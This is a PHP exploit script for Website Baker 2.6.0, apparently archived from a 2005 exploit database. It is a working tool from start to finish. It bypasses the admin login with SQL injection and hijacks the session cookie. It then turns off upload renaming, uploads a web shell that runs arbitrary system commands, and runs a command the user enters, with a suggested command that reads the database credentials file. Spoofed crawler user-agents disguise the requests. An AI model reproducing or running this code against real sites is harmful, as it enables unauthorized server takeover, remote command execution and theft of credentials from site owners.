<?php
#  ---wbaker_260_xpl.php                                19.42 02/12/2005       #
#                                                                              #
#     Website Baker 2.6.0  Login Bypass / remote commands execution            #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  -> this works with magic_quotes_gpc off                                     #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun Tzu: "The control of a large force is the same principle as the control #
#  of a few men: it is merely a question of dividing up their numbers."        #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title>Website Baker <=2.6.0 Login Bypass/remote cmmnds  xction
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
Website Baker <=2.6.0 Login Bypass/remote cmmnds  xction </p><p class="Stile6">a
script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
name="form1" method="post"  action="'.strip_tags($SERVER[PHP_SELF]).'"><p><input
type="text"  name="host"> <span class="Stile5">* hostname (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/wbaker/ or just / )    </span></p><p><input type="text" name="command">   <span
class="Stile5"> * specify a command ( "cat ./../config.php" to  see     database
username & password             </span> </p> <p> <input type="text" name="port">
<span class="Stile5">specify  a  port   other than  80 ( default  value )</span>
</p><p><input  type="text"   name="proxy"><span class="Stile5">  send    exploit
through an  HTTP proxy (ip:port)</span></p><p><input type="submit" name="Submit"
 value="go!"></p></form> </td></tr></table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                                    }
	                       else
		                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
      {$ock=fsockopen(gethostbyname($host),$port);
       if (!$ock) { echo 'No response from '.htmlentities($host);
			die; }
      }
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}
$host=$_POST[host];$path=$_POST[path];
$port=$_POST[port];$command=$_POST[command];
$proxy=$_POST[proxy];

if (($host<>'') and ($path<>'') and ($command<>''))
{
    $port=intval(trim($port));
    if ($port=='') {$port=80;}
    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
    $host=str_replace("\r\n","",$host);
    $path=str_replace("\r\n","",$path);

    #STEP 1 -> if magic_quotes_gpc off -> Login bypass
    $SQL="'or isnull(1/0)/*";
    $SQL=urlencode($SQL);
    $data="url=&username_fieldname=username&password_fieldname=password&username=".$SQL;
    $data.="&password=suntzu&submit=Login";
    $packet="POST ".$p."admin/login/index.php HTTP/1.1\r\n";
    $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
    $packet.="Referer: http://".$host.":".$port.$path."admin/login/index.php\r\n";
    $packet.="Accept-Language: ru\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Accept-Encoding: text/plain\r\n";
    $packet.="User-Agent: AmfibiBOT\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Cache-Control: no-cache\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);
    if (eregi("Location:",$html)) {echo "Exploit succeeded...-> next step...";}
                            else  {echo "Exploit failed...";die;}
    $temp=explode("Set-Cookie: ",$html);
    $temp2=explode(' ',$temp[1]);
    $COOKIE=$temp2[0];
    echo '<br>Your cookie: '.htmlentities($COOKIE);

    #STEP 2 -> modify settings to not rename .php files when uploaded
    $data="world_writeable=true&operating_system=linux&file_u_r=true&file_u_w=true&file_u_e=true";
    $data.="&file_g_r=true&file_g_w=true&file_g_e=true";
    $data.="&file_o_r=true&file_o_w=true&file_o_e=true";
    $data.="&dir_u_r=true&dir_u_w=true&dir_u_e=true";
    $data.="&dir_g_r=true&dir_g_w=true&dir_g_e=true";
    $data.="&dir_o_r=true&dir_o_w=true&dir_o_e=true";
    $data.="&rename_files_on_upload=php3&submit=Save";
    $packet="POST ".$p."admin/settings/save.php HTTP/1.1\r\n";
    $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
    $packet.="Referer: http://".$host.":".$port.$path."admin/settings/index.php?advanced=yes\r\n";
    $packet.="Accept-Language: en\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Accept-Encoding: text/plain\r\n";
    $packet.="User-Agent: Googlebot-Image/1.0 ( http://www.googlebot.com/bot.html)\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Cache-Control: no-cache\r\n";
    $packet.="Cookie: ".$COOKIE."\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);


    #STEP 3 -> Upload a shell...
$data='-----------------------------7d51ed6470314
Content-Disposition: form-data; name="target"

/media
-----------------------------7d51ed6470314
Content-Disposition: form-data; name="submit"

Upload Fil(er)
-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file1"; filename="suntzu.php"
Content-Type:

<?php echo "Hi Master!";error_reporting(0);ini_set("max_execution_time",0);system($_GET[cmd]);?>
-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file2"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file3"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file4"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file5"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file6"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file7"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file8"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file9"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314
Content-Disposition: form-data; name="file10"; filename=""
Content-Type: application/octet-stream


-----------------------------7d51ed6470314--';

    $packet="POST ".$p."admin/media/upload.php HTTP/1.1\r\n";
    $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
    $packet.="Referer: http://".$host.":".$port.$path."admin/media/index.php\r\n";
    $packet.="Accept-Language: en\r\n";
    $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d51ed6470314\r\n";
    $packet.="Accept-Encoding: gzip, deflate\r\n";
    $packet.="User-Agent: Fast PartnerSite Crawler\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Cache-Control: no-cache\r\n";
    $packet.="Cookie: ".$COOKIE."\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);

    #STEP 4 -> Launch commands...
    $packet="GET ".$p."media/suntzu.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
    $packet.="Accept-Encoding: text/plain\r\n";
    $packet.="User-Agent: BigBrother/1.6e\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    show($packet);
    sendpacketii($packet);
    if (eregi("Hi Master",$html)) {echo "Exploit fully succeeded...";}
                     else         {echo "If you are here SQL injection succeeded, but for some reason failed to upload the shell";}
}
else {echo "Fill * required fields, optionally specify a proxy..."; }
?>

# milw0rm.com [2005-12-08]
